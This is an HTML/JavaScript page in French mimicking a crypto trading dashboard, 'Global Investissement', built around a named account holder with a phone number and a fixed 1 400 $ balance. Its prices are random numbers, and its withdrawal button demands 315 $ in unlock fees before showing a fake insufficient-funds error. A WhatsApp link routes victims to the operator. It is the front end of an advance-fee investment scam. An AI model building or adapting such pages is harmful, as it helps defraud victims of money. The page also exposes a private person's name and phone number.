<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Investissement - Crypto Trading</title>
    <link rel="stylesheet" href="styles.css"> <!-- External CSS for better organization -->
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #121212;
            color: #ffffff;
        }

        header {
            background-color: #1f1f1f;
            display: flex;
            justify-content: space-between;
            padding: 15px 30px;
            align-items: center;
        }

        header .logo h1 {
            margin: 0;
            color: #f0b90b;
            font-size: 24px;
        }

        nav ul {
            list-style-type: none;
            margin: 0;
            padding: 0;
            display: flex;
        }

        nav ul li {
            margin-right: 30px;
        }

        nav ul li a {
            color: #ffffff;
            text-decoration: none;
            font-size: 16px;
        }

        nav .actions {
            display: flex;
            align-items: center;
        }

        nav .actions .balance {
            color: #f0b90b;
            margin-right: 30px;
            font-weight: bold;
        }

        nav .actions .account-info {
            margin-right: 30px;
        }

        nav .actions button {
            background-color: #f0b90b;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            color: #121212;
            font-weight: bold;
            border-radius: 5px;
            margin-right: 10px;
        }

        main {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 30px;
        }

        .trading-interface {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 1200px;
        }

        .price-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #1c1c1c;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            color: #58a6ff;
        }

        .price-info h2 {
            margin: 0;
            font-size: 24px;
        }

        .price-info .price {
            font-size: 28px;
            font-weight: bold;
        }

        .price-info .variation {
            color: green;
        }

        #chart_container {
            height: 500px;
            background-color: #1c1c1c;
            margin-bottom: 20px;
            border-radius: 10px;
            width: 100%;
        }

        #tradingview_chart {
            height: 100%;
            width: 100%;
        }

        .order-book {
            background-color: #1c1c1c;
            padding: 20px;
            border-radius: 10px;
            width: 100%;
            margin-bottom: 20px;
        }

        .order-book h3 {
            margin-top: 0;
            color: #58a6ff;
            font-size: 20px;
        }

        .orders .order {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            color: #ffffff;
        }

        .orders .order span {
            width: 33%;
            text-align: center;
        }

        .actions-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
            width: 100%;
        }

        .actions-container button {
            background-color: #f0b90b;
            border: none;
            padding: 15px 30px;
            cursor: pointer;
            color: #121212;
            font-weight: bold;
            width: 48%;
            border-radius: 10px;
        }

        .withdrawal-form {
            display: none;
            flex-direction: column;
            background-color: #1c1c1c;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            width: 100%;
        }

        .withdrawal-form h3 {
            margin-top: 0;
            color: #58a6ff;
            font-size: 20px;
        }

        .form-info {
            margin-bottom: 20px;
        }

        .withdrawal-form button {
            background-color: #f0b90b;
            border: none;
            padding: 15px;
            cursor: pointer;
            color: #121212;
            font-weight: bold;
            align-self: center;
            border-radius: 10px;
        }

        footer {
            background-color: #1f1f1f;
            color: #ffffff;
            text-align: center;
            padding: 20px 0;
        }

        @media (max-width: 768px) {
            header, nav, .price-info, .order-book, .actions-container, .withdrawal-form {
                padding: 10px;
                margin-bottom: 15px;
            }

            .price-info {
                flex-direction: column;
                align-items: flex-start;
            }

            .actions-container {
                flex-direction: column;
                align-items: center;
            }

            .actions-container button {
                width: 100%;
                margin-bottom: 10px;
            }

            nav ul {
                flex-direction: column;
                align-items: center;
            }

            nav ul li {
                margin-bottom: 10px;
            }

            nav .actions {
                flex-direction: column;
                align-items: flex-start;
            }

            nav .actions .balance,
            nav .actions .account-info {
                margin-bottom: 10px;
            }
        }
    </style>
    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
</head>
<body>
    <script>
        let code = prompt("Veuillez entrer le code d'accès :");
        if (code === "8080") {
            document.body.style.display = 'block';
        } else {
            alert("Code incorrect. Accès refusé.");
            document.body.style.display = 'none';
        }
    </script>

    <header>
        <div class="logo">
            <h1>Global Investissement</h1>
        </div>
        <nav>
            <div class="actions">
                <span class="balance">Solde: 1 400 $</span>
                <div class="account-info">
                    <span id="user-name">MAVAKALA CLEMENCE</span><br>
                    <span id="user-phone">243 089 252 2528</span>
                </div>
                <button id="whatsapp-button">Contact WhatsApp</button>
                <button id="logout-button">Déconnexion</button>
            </div>
        </nav>
    </header>
    <main>
        <div class="trading-interface">
            <section class="price-info">
                <h2>BTC/USDT</h2>
                <div class="price">67,969.20</div>
                <div class="variation">+0.17%</div>
            </section>
            <section id="chart_container">
                <div id="tradingview_chart"></div>
            </section>
            <section class="order-book">
                <h3>Order Book</h3>
                <div class="orders">
                    <div class="order">
                        <span class="price">67,974.35</span>
                        <span class="amount">0.19707 BTC</span>
                        <span class="total">13,395.70515 USDT</span>
                    </div>
                    <!-- Repeat for more orders -->
                </div>
            </section>
            <section class="actions-container">
                <button id="orange-money">Retirer via Orange Money</button>
                <button id="paypal">Retirer via PayPal</button>
            </section>
            <section class="withdrawal-form" id="withdrawal-form">
                <h3>Confirmer le retrait</h3>
                <div class="form-info" id="withdrawal-info"></div>
                <button id="confirm-withdrawal">Valider le Retrait</button>
            </section>
            <section class="error-message" id="error-message"></section>
        </div>
    </main>
    <footer>
        <p>© 2024 Africa Investissement. Tous droits réservés.</p>
    </footer>
    <script src="script.js"></script> <!-- External JS for better organization -->
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const priceElement = document.querySelector('.price-info .price');
            const variationElement = document.querySelector('.price-info .variation');
            const errorMessage = document.getElementById('error-message');
            const withdrawalForm = document.getElementById('withdrawal-form');
            const withdrawalInfo = document.getElementById('withdrawal-info');

            const updatePrice = () => {
                const newPrice = (Math.random() * (70000 - 65000) + 65000).toFixed(2);
                const newVariation = (Math.random() * (2) - 1).toFixed(2);
                priceElement.textContent = newPrice;
                variationElement.textContent = `${newVariation}%`;
            };

            setInterval(updatePrice, 5000);

            const setWithdrawalInfo = (method) => {
                const accountName = "MAVAKALA CLEMENCE";
                const accountNumber = "243 089 252 2528";
                const balance = "1 400 $";
                withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                withdrawalForm.style.display = 'flex';
            };

            document.getElementById('orange-money').addEventListener('click', () => {
                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Orange Money ?");
                if (confirmWithdrawal) {
                    setWithdrawalInfo("Orange Money");
                }
            });

            document.getElementById('paypal').addEventListener('click', () => {
                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via PayPal ?");
                if (confirmWithdrawal) {
                    alert("Vous n'avez pas de compte PayPal lié.");
                }
            });

            document.getElementById('confirm-withdrawal').addEventListener('click', () => {
                alert('Cher MAVAKALA, veuillez payer les frais de déblocages de 315 $ pour recevoir vos bénéfices dans les 5 minutes.');
                withdrawalForm.style.display = 'none';
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'Erreur : Fonds insuffisants pour les frais de déblocage.';
            });

            document.getElementById('whatsapp-button').addEventListener('click', () => {
                window.location.href = "https://wa.me/16263231795";
            });

            document.getElementById('logout-button').addEventListener('click', () => {
                alert("Déconnexion réussie.");
                window.location.reload();
            });

            new TradingView.widget({
                container_id: "tradingview_chart",
                autosize: true,
                symbol: "BINANCE:BTCUSDT",
                interval: "D",
                timezone: "Etc/UTC",
                theme: "dark",
                style: "1",
                locale: "fr",
                toolbar_bg: "#f1f3f6",
                enable_publishing: false,
                allow_symbol_change: true,
                hideideas: true
            });
        });
    </script>
</body>
</html>
